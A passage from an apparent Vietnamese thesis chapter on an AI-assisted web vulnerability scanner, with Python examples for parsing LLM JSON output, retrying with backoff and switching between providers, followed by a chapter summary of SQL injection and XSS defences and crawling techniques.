Xử lý response từ LLM đòi hỏi cơ chế parse linh hoạt vì đầu ra không phải lúc nào cũng tuân theo format JSON thuần túy như yêu cầu trong prompt. LLM có thể bọc JSON trong markdown code block với ký hiệu ba dấu backtick, thêm text giải thích trước hoặc sau JSON, hoặc trả về format không hoàn toàn đúng cú pháp với các lỗi nhỏ như thiếu dấu phẩy hoặc dấu ngoặc đóng. Hệ thống cần implement logic trích xuất JSON từ response text bằng cách tìm vị trí mở và đóng của object JSON, xử lý các trường hợp ngoại lệ và fallback về hiển thị raw text khi parse thất bại để không gây lỗi nghiêm trọng cho toàn bộ pipeline.

```python
import json

def parse_ai_response(response_text):
    try:
        result = json.loads(response_text)
        return result
    except json.JSONDecodeError:
        start = response_text.find('{')
        end = response_text.rfind('}') + 1
        if start != -1 and end > start:
            json_str = response_text[start:end]
            return json.loads(json_str)
        return {'raw_response': response_text}
```

Khi tương tác với API bên ngoài, xử lý lỗi và cơ chế fallback là yếu tố thiết yếu để đảm bảo hệ thống hoạt động ổn định trong các điều kiện không lý tưởng. Rate limiting xảy ra khi gửi quá nhiều request trong khoảng thời gian ngắn vượt quá quota của tier sử dụng, hệ thống cần implement retry với exponential backoff trong đó thời gian chờ tăng theo cấp số nhân giữa các lần thử lại để tránh làm tình trạng nghẽn trở nên trầm trọng hơn. Timeout cần được đặt hợp lý từ 30 đến 60 giây để tránh request bị treo vô thời hạn khi server gặp sự cố đồng thời cho LLM đủ thời gian xử lý các prompt phức tạp. Khi API không khả dụng, hệ thống cần có cơ chế fallback như chuyển sang provider khác hoặc hiển thị kết quả quét mà không có phần tư vấn AI để người dùng vẫn nhận được giá trị từ phần phát hiện rule-based. Response không đúng format cần được validate và xử lý gracefully thay vì gây crash toàn bộ hệ thống.

```python
import time

def call_with_retry(prompt, max_retries=3):
    for attempt in range(max_retries):
        try:
            response = call_llm_api(prompt)
            if response and 'error' not in response:
                return response
        except Exception as e:
            if attempt < max_retries - 1:
                wait_time = 2 ** attempt
                time.sleep(wait_time)
            else:
                return None
    return None
```

Để tăng tính sẵn sàng và giảm phụ thuộc vào một nhà cung cấp duy nhất, hệ thống áp dụng kiến trúc đa mô hình (multi-provider architecture). Thay vì gắn chặt với một LLM provider cụ thể, hệ thống định nghĩa interface chung cho việc gọi AI và implement nhiều provider cụ thể như Gemini, DeepSeek và Blackbox. Khi provider chính gặp sự cố hoặc trả về lỗi, hệ thống tự động chuyển sang provider dự phòng theo thứ tự ưu tiên đã cấu hình, đảm bảo tính năng tư vấn AI vẫn hoạt động ngay cả khi một provider ngừng dịch vụ tạm thời. Kiến trúc này còn cho phép so sánh chất lượng phản hồi giữa các mô hình khác nhau trong quá trình đánh giá, từ đó đưa ra quyết định lựa chọn provider tối ưu cho mục đích cụ thể của hệ thống.

```python
class AIAdvisor:
    def __init__(self):
        self.providers = ['gemini', 'deepseek', 'blackbox']
    
    def get_analysis(self, vulnerability_data):
        for provider in self.providers:
            try:
                result = self._call_provider(provider, vulnerability_data)
                if result:
                    return result
            except Exception:
                continue
        return self._default_response(vulnerability_data)
```

## 2.6. Tổng kết chương

Chương 2 đã trình bày hệ thống các cơ sở lý thuyết cần thiết cho việc xây dựng hệ thống quét lỗ hổng web tích hợp trí tuệ nhân tạo. Các nội dung được trình bày cung cấp nền tảng kiến thức bao quát từ kiến trúc cơ bản của ứng dụng web, đặc điểm của các lỗ hổng bảo mật mục tiêu, kỹ thuật crawling thu thập dữ liệu kiểm thử, phương pháp phát hiện tự động đến tổng quan về trí tuệ nhân tạo sinh và cách tích hợp vào quy trình phân tích bảo mật.

Phần kiến trúc ứng dụng web cung cấp nền tảng để hiểu cách dữ liệu được truyền tải và xử lý trong mô hình Client-Server, từ đó xác định các điểm mà kẻ tấn công có thể can thiệp vào dòng dữ liệu để khai thác lỗ hổng. Giao thức HTTP với các phương thức, headers và mã trạng thái là ngôn ngữ giao tiếp mà hệ thống quét cần thành thạo để gửi request kiểm thử và phân tích response một cách chính xác. Phần lỗ hổng bảo mật web phân tích chi tiết hai loại lỗ hổng mục tiêu của đề tài là SQL Injection với nguyên nhân từ việc nối chuỗi trực tiếp trong truy vấn SQL và biện pháp phòng chống hiệu quả nhất là Parameterized Queries, và Cross-Site Scripting với nguyên nhân từ việc thiếu mã hóa đầu ra và biện pháp phòng chống chính là Output Encoding kết hợp Content Security Policy.

Phần web crawling trình bày thuật toán BFS phù hợp cho việc duyệt website có kiểm soát độ sâu, kỹ thuật trích xuất liên kết và biểu mẫu bằng HTML parsing với BeautifulSoup, cùng các cơ chế kiểm soát phạm vi crawl đảm bảo hoạt động an toàn và hiệu quả trong giới hạn cho phép. Phần kỹ thuật phát hiện tự động mô tả quy trình bốn giai đoạn từ Crawl đến Test, Analyze và Report, phương pháp rule-based detection với các ưu nhược điểm đặc trưng, và ba chiến lược phân tích response gồm Error-based, Content length anomaly và Status code change được kết hợp thông qua cơ chế tính điểm tổng hợp để giảm thiểu false positives.

Phần trí tuệ nhân tạo sinh giới thiệu LLM với kiến trúc Transformer, khả năng ứng dụng trong bảo mật, kỹ thuật Prompt Engineering với năm nguyên tắc thiết kế cốt lõi, và phương pháp tương tác API bao gồm xử lý lỗi cùng kiến trúc đa mô hình để đảm bảo tính sẵn sàng của dịch vụ. Toàn bộ các kiến thức lý thuyết được trình bày trong chương sẽ được vận dụng cụ thể trong Chương 3 để phân tích yêu cầu và thiết kế kiến trúc hệ thống, và trong Chương 4 để triển khai các module mã nguồn tương ứng phục vụ mục tiêu xây dựng hệ thống nguyên mẫu hoàn chỉnh.
